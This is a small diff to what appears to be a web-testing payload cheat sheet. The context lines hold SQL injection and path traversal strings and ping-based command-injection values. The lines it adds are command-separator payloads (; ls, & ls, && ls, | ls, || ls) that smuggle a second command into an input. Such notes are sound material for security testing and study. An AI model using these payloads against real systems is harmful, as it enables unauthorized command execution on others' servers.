@@ -12,6 +12,15 @@ SELECT name, type FROM USERS WHERE name LIKE "%1"; SELECT * FROM USERS WHERE "%"
 @mail;ping+-c+10+127.0.0.1;                  @mail||ping+-c+10+127.0.0.1||    
 ../../../../
 
+
+
+; ls  //Break's  prior command
+& ls
+&& ls
+| ls
+|| ls
+
+
 ```````````````````
 URL ENCODING FUNCTION
 [ ] Space = %20
